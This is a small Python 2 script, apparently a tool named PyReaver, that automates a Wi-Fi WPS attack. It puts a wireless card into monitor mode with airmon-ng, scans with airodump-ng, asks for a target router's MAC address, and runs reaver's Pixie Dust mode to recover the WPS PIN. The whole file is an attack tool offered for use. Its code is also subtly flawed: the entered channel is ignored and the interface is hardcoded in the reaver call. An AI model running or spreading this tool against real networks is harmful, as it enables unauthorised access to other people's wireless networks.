import os
import sys
print
print "*"*60
print " Starting Monitor Mode"
print "*"*60
print
os.system("airmon-ng start wlp2s0")
print
print "*"*60
print " Wifi Scan "
print "*"*60
print
interface = raw_input("Enter Interface,wlp2s0mon :")
os.system("airodump-ng {}".format(interface))
print
print "Press Ctrl + c"
print
os.system("figlet -f standard PyReaver")
print "Author : Rahat Khan Tusar(RKT)"
print 
print "Github : https://github.com/r3k4t"
print
print "*"*60
print " ReaverWPS "
print "*"*60
print
mac  = raw_input("Enter Target mac address:")
c = raw_input("Target Channel: ")
os.system("reaver -i wlp2s0mon  -b{} -vv -K 1".format(mac,c))
